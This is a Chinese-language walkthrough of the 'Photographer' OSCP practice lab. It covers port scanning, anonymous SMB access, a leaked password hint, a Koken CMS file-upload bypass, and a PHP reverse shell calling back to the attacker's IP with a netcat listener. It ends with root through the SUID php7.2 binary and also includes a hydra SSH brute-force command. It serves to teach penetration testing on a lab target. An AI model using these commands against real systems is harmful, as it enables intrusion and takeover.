# OSCP系列靶场-Esay-Photographer

## 总结

`getwebshell`: `SMB`免密访问 → 发现敏感邮箱 → 获得用户名以及密码 → 登录后台 → 文件上传`getwebshell`

`提 权 思 路`: `suid`权限文件查找 → `php`之`suid`提权

## 准备工作

  * 启动VPN  
获取攻击机IP → `192.168.45.194`

![](https://image.3001.net/images/20230812/1691846818_64d788a23f63203c1aa5c.png!small)

  * 启动靶机  
获取目标机器IP → `192.168.203.76`

![](https://image.3001.net/images/20230812/1691846819_64d788a346378b720dfb1.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次(多次扫描减少误扫)

    
    
    # tcp全端口扫描
    sudo nmap --min-rate 10000 -p- 192.168.203.76
    
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    8000/tcp open  http-alt
    

![](https://image.3001.net/images/20230812/1691846820_64d788a423d797bf92611.png!small)

    
    
    # ucp全端口扫描
    sudo nmap -sU --min-rate 10000 -p- 192.168.203.76
    
    PORT    STATE SERVICE
    137/udp open  netbios-ns
    

![](https://image.3001.net/images/20230812/1691846821_64d788a514375b4f750b9.png!small)  
`开放的端口Tcp-→22,80,139,445,8000`  
`开放的端口Ucp-→137`

### 目标端口对应服务探测

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p22,80,139,445,8000 192.168.203.76
    

![](https://image.3001.net/images/20230812/1691846822_64d788a64381ef880af32.png!small)

    
    
    # udp探测
    sudo nmap -sT -sV -O -sC -p137 192.168.203.76
    
    PORT    STATE  SERVICE    VERSION
    137/tcp closed netbios-ns
    

![](https://image.3001.net/images/20230812/1691846823_64d788a75b80e0e4b52d6.png!small)

## 信息收集-端口测试

开放的端口看起来有点小多，但是137，139，445端口的开放本质上就是`SMB`服务的开放。 80与8000是http服务

### 22-SSH端口的信息收集

#### 22-SSH端口版本信息与MSF利用

通过`Nmap`探测获得SSH的版本信息，可以尝试利用  
探测版本为`OpenSSH 7.2p2 Ubuntu`

    
    
    # 搜索对应脚本
    msf6 → searchsploit OpenSSH 7.2p2
    

发现搜索到可利用的和用户枚举有关（待定）

![](https://image.3001.net/images/20230812/1691846824_64d788a85e2cf279e409d.png!small)

#### 22-SSH协议支持的登录方式

通过`Nmap`探测获得SSH的版本信息，在获取到某个用户名之后尝试

    
    
    sudo ssh root @192.168.203.76 -v
    

显示`publickey`、`password`就是支持密钥以及密码登录

![](https://image.3001.net/images/20230812/1691846825_64d788a9525506c259ac6.png!small)

#### 22-SSH手动登录尝试(无)

因为支持密码登录，尝试`root`账户的密码弱密码尝试

    
    
    sudo ssh root @192.168.203.76 -p 22
    # 密码尝试
    password → root
    

![](https://image.3001.net/images/20230812/1691846826_64d788aadeae8bbfb0fc5.png!small)  
弱密码尝试失败

#### 22-SSH弱口令爆破(静静等待)

因为支持密码登录，尝试`root`账户的密码爆破，利用工具`hydra`，线程-t为6

    
    
    sudo hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 -vV 192.168.203.76 ssh -s 22
    

挂着工具进行爆破，我们尝试后续信息收集

![](https://image.3001.net/images/20230812/1691846827_64d788abd0d837014e422.png!small)

### 80-HTTP端口的信息收集

访问 `http://192.168.203.76:80`应该是一个标准的`CMS`，还有作者

![](https://image.3001.net/images/20230812/1691846829_64d788ad19afcd815e1d4.png!small)

#### 信息收集-网站指纹

    
    
    ┌──(root㉿Kali)-[/home/bachang/Photographer]
    └─# whatweb http://192.168.203.76:80  
    http://192.168.203.76:80 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.203.76], JQuery, Script, Title[Photographer by v1n1v131r4]
    

`CMS`应该是`Photographer`

![](https://image.3001.net/images/20230812/1691846830_64d788ae715bce759bde9.png!small)

#### 漏洞利用-网站指纹

    
    
    searchsploit Photographer
    

找了一下看上去不太像捏

![](https://image.3001.net/images/20230812/1691846831_64d788af69a0dc51730f2.png!small)

#### 信息收集-HTML隐藏信息查看

    
    
    # 利用html2text转换纯文本方便查看
    curl http://192.168.203.76:80 | html2text
    

没什么隐藏信息

![](https://image.3001.net/images/20230812/1691846832_64d788b06d4c1ae00a7ee.png!small)

#### 信息收集-目录扫描

##### 信息收集-目录扫描初步

    
    
    dirsearch -u http://192.168.203.76:80 -x 302,403
    

![](https://image.3001.net/images/20230812/1691846833_64d788b182d9e36351f07.png!small)  
因为扫出了目录，深层次的扫描待选

    
    
    信息收集-目录扫描(后缀)
    信息收集-目录扫描(深度/大字典)
    信息收集-目录扫描(深度/大字典后缀)
    

#### 信息收集-目录访问

##### /assets/端点

发现这里存在文件路径遍历

![](https://image.3001.net/images/20230812/1691846834_64d788b2617840ffe09cd.png!small)  
戳进去看了看没啥信息

![](https://image.3001.net/images/20230812/1691846835_64d788b33a2a12fcb2cfc.png!small)

##### /images/端点同理

![](https://image.3001.net/images/20230812/1691846836_64d788b40dc44bc1d4c04.png!small)

### 445-SMB端口的信息收集

#### 445-SMB是否无需密码探测(存在)

连接成功则SMB没有开启密码

    
    
    # 利用-L查看SMB的内容
    smbclient -L //192.168.203.76
    

![](https://image.3001.net/images/20230812/1691846837_64d788b51a2981b21b84b.png!small)

#### 445-SMB文件信息收集

    
    
    # 利用获取到的[sambashare]直接进行访问查看内容
    smbclient //192.168.203.76/sambashare -U root
    

发现了一个`txt`以及一个`zip`文件，`zip`看上去是源码备份，太大了下载不了。

![](https://image.3001.net/images/20230812/1691846838_64d788b64b038cf65625e.png!small)

#### 445-SMB用户名获取(待定)

    
    
    # 抓取用户名
    enum4linux 192.168.203.76
    

![](https://image.3001.net/images/20230812/1691846839_64d788b796766f7a9b7e2.png!small)

#### 445-SMB的上传(不行)

    
    
    # 创建一个文本测试上传
    touch 1.txt
    # 利用获取到的sambashare直接进行访问之后尝试使用PUT是否成功
    smbclient //192.168.203.76/sambashare -U root
    smb :\ → put 1.txt
    

![](https://image.3001.net/images/20230812/1691846840_64d788b8e265de39184de.png!small)

#### 445文件查看

里面只有一个文本可以查看

    
    
    # cat mailsent.txt  
    Message-ID: 
    Date: Mon, 20 Jul 2020 11:40:36 -0400
    From: Agi Clarence 
    User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
    X-Accept-Language: en-us, en
    MIME-Version: 1.0
    To: Daisa Ahomi 
    Subject: To Do - Daisa Website's
    Content-Type: text/plain; charset=us-ascii; format=flowed
    Content-Transfer-Encoding: 7bit
    
    Hi Daisa!
    Your site is ready now.
    Don't forget your secret, my babygirl ;)
    

大致内容是`agi @photographer.com`写给`daisa @photographer.com`???  
应该是agi给daisa建了站，然后让daisa不要忘记密码 `my babygirl ;)`  
推测密码和 `my babygirl ;)`有关

### 8000-HTTP端口的信息收集

访问 `http://192.168.203.76:8000`不是`CMS`我们直接从`HTML`隐藏信息收集开始

#### 信息收集-网站指纹

    
    
    # whatweb http://192.168.203.76:8000
    http://192.168.203.76:8000 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.203.76], JQuery[1.12.4], Meta-Author[daisa ahomi], MetaGenerator[Koken 0.22.24], Script, Title[daisa ahomi], X-UA-Compatible[IE=edge]
    

得到了`CSM`信息`Koken 0.22.24`以及`daisa ahomi`，应该是`daisa`的站点

![](https://image.3001.net/images/20230812/1691846841_64d788b9c5fced76b1e34.png!small)

#### 漏洞利用-网站指纹

    
    
    searchsploit Koken 0.22.24
    

发现了一条文件上传

![](https://image.3001.net/images/20230812/1691846842_64d788baa0879d1e379ca.png!small)  
查看了一下

    
    
    cat /usr/share/exploitdb/exploits/php/webapps/48706.txt
    

利用`burp`修改后缀进行上传绕过

![](https://image.3001.net/images/20230812/1691846843_64d788bb7c1df9f172607.png!small)

访问对应提供的路径是`404`，去掉了一级目录发现是个`api`，应该需要先找到上传点，等目录扫描之后再看  
![](https://image.3001.net/images/20230812/1691846844_64d788bc7bcc0d4473666.png!small)

#### 信息收集-HTML隐藏信息查看

    
    
    # 利用html2text转换纯文本方便查看
    curl http://192.168.203.76:8000 | html2text
    

没什么信息  
![](https://image.3001.net/images/20230812/1691846845_64d788bd8297aa691e7a8.png!small)

#### 信息收集-目录扫描

##### 信息收集-目录扫描初步

    
    
    dirsearch -u http://192.168.203.76:8000 -x 302,403
    

![](https://image.3001.net/images/20230812/1691846846_64d788be6fd37f002880a.png!small)  
因为扫出了目录，深层次的扫描待选

    
    
    信息收集-目录扫描(后缀)
    信息收集-目录扫描(深度/大字典)
    信息收集-目录扫描(深度/大字典后缀)
    

#### 信息收集-目录访问

尝试访问几个端点

![](https://image.3001.net/images/20230812/1691846847_64d788bf960ecc77951e1.png!small)  
最终发现只有上传点可行 `http://192.168.203.76:8000/admin/index.html  
得到了一个登录端点

![](https://image.3001.net/images/20230812/1691846848_64d788c09e6374a809aa2.png!small)

## 漏洞利用-getwebshell

### 登录端点最佳实践

发现存在登录端点时尝试的最佳实践指南

#### 漏洞利用-默认凭证

若存在`目标的指纹`网上公开查找是否存在通用账号以及默认密码

![](https://image.3001.net/images/20230812/1691846849_64d788c1dd1ce0030b894.png!small)

#### 漏洞利用-信息泄露

该登录端点需要的是邮箱进行登录，之前的title我们知道8000是`daisa`的站点  
账号锁定为`daisa @photographer.com`密码和 `my babygirl ;)`有关  
尝试进行登录

![](https://image.3001.net/images/20230812/1691846850_64d788c2d9cd8fbaff594.png!small)  
尝试登录，多次测试之后发现密码是`babygirl`

![](https://image.3001.net/images/20230812/1691846852_64d788c4c53a4af2afdd3.png!small)

### 文件上传getwebshell

登录之后寻找和`content`有关的端点，发现上传点的位置

![](https://image.3001.net/images/20230812/1691846853_64d788c5b38d53ad7f09c.png!small)  
启动`burp`，准备`反弹shell`

    
    
    # 利用cp命令cp一个kali自带的shell到当前文件夹并且命名为shell.jgp
    sudo cp /usr/share/webshells/php/php-reverse-shell.php ./shell.jpg
    
    
    
    # 开启监听
    sudo nc -lvnp 5555
    

反弹shell配置

    
    
    # 利用grep确定修改反弹shell_ip的第49行
    grep -n "127.0.0.1" shell.jpg                
    → 49:$ip = '127.0.0.1';  // CHANGE THIS
    # 同理监听端口是第50行
    grep -n "1234" shell.php
    50:$port = 1234;       // CHANGE THIS
    # 利用sed命令替换里面的内容
    sed -i '49s/127.0.0.1/192.168.45.194/' shell.jpg
    sed -i '50s/1234/5555/' shell.jpg
    # 利用sed查看49与50行是否修改成功
    sed -n '49,50p' shell.jpg
    

![](https://image.3001.net/images/20230812/1691846854_64d788c6ec30501aaa4b3.png!small)

`burp`进行后缀修改

![](https://image.3001.net/images/20230812/1691846856_64d788c8740873060eafb.png!small)  
修改两处

![](https://image.3001.net/images/20230812/1691846857_64d788c9a61492d4338aa.png!small)  
跟随重定向到上传地址

![](https://image.3001.net/images/20230812/1691846859_64d788cb2b63c4d8a35ce.png!small)

    
    
    curl http:\/\/192.168.203.76:8000\/storage\/originals\/78\/8c\/shell.php
    

访问成功`反弹shell`

![](https://image.3001.net/images/20230812/1691846861_64d788cd0324bbd8b0fc0.png!small)

## 内网遨游-getshell

### 交互shell

由于获取的shell交互不友好，利用python获得新的交互shell

    
    
    python -c "import pty;pty.spawn('/bin/bash')";
    

![](https://image.3001.net/images/20230812/1691846862_64d788cebd9dca41b2a52.png!small)

### FLAG1获取

    
    
    www-data @photographer:/$ find / -name local.txt 2→/dev/null
    /home/daisa/local.txt
    www-data @photographer:/$ cat /home/daisa/local.txt
    a509b595ea9755912085875166c1b4e8
    

### 信息收集-内网基础信息收集

提权的本质在于`枚举`，在获取shell之后我们要进行内网信息的收集，都是为了`提权`做准备

#### 检测Linux操作系统的发行版本

较老的`Ubuntu`以及Linux系统可以`overlayfs`提权

    
    
    # 确定发行版本
    www-data @photographer:/$ lsb_release -a                      
    No LSB modules are available.
    Distributor ID: Ubuntu
    Description:    Ubuntu 16.04.6 LTS
    Release:        16.04
    Codename:       xenial
    

发行版本为`Ubuntu 16.04`，不太能`overlayfs`提权

#### 检测Linux操作系统的内核版本

较低的内核版本可以进行`脏牛`提权

    
    
    www-data @photographer:/$ uname -a
    Linux photographer 4.15.0-115-generic #116~16.04.1-Ubuntu SMP Wed Aug 26 17:36:48 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
    

内核版本为`4.15.0`

![](https://image.3001.net/images/20230812/1691846864_64d788d0312022a0c5326.png!small)

#### 检测当前用户的权限

    
    
    www-data @photographer:/$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

#### 列举出所有的sudo文件

查找具有`sudo`权限，且不需要密码的可提权文件  
如果发现`sudo -l`有东西的话 访问 `https://gtfobins.github.io`寻找

    
    
    # 利用sudo -l寻找
    sudo -l
    

发现需要密码

![](https://image.3001.net/images/20230812/1691846865_64d788d151cb5b66c08a2.png!small)

#### 列举出所有suid文件

如果发现`u=s`有东西的话 访问 `https://gtfobins.github.io`寻找

    
    
    # -perm 文件权限
    www-data @photographer:/$ find / -perm -u=s -type f 2→/dev/null
    find / -perm -u=s -type f 2→/dev/null
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/xorg/Xorg.wrap
    /usr/lib/snapd/snap-confine
    /usr/lib/openssh/ssh-keysign
    /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/sbin/pppd
    /usr/bin/pkexec
    /usr/bin/passwd
    /usr/bin/newgrp
    /usr/bin/gpasswd
    /usr/bin/php7.2
    /usr/bin/sudo
    /usr/bin/chsh
    /usr/bin/chfn
    /bin/ping
    /bin/fusermount
    /bin/mount
    /bin/ping6
    /bin/umount
    /bin/su
    

![](https://image.3001.net/images/20230812/1691846866_64d788d270bcbc2c36917.png!small)

### 权限提升

#### suid权限提升之php

在`suid`文件中发现一个脚本语言

![](https://image.3001.net/images/20230812/1691846868_64d788d427ab567482f87.png!small)  
如果发现有东西的话 访问 https://gtfobins.github.io 寻找

![](https://image.3001.net/images/20230812/1691846869_64d788d5370306ec9ed2d.png!small)

    
    
    sudo install -m =xs $(which php) .
    
    CMD="/bin/sh"
    ./php -r "pcntl_exec('/bin/sh', ['-p']);"
    

修改一下成功进行提权

    
    
    www-data @photographer:/$ php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
    # id
    id
    uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
    

### FLAG2获取

    
    
    # cat /root/proof.txt
    da9106af9eb8e2c891067610b1522ace
    

![](https://image.3001.net/images/20230812/1691846869_64d788d5e82f8165d5a2c.png!small)  
完结撒花~

![](https://image.3001.net/images/20230812/1691846870_64d788d6c818f3bfb7bd1.png!small)

## 总结

这个敏感信息中的密码格式蛮奇怪的  
`My xxxxx ;) `格式的时候留意一下 `xxxxx`可能是密码

`;)`这个应该是颜表情，为啥不`:-)`

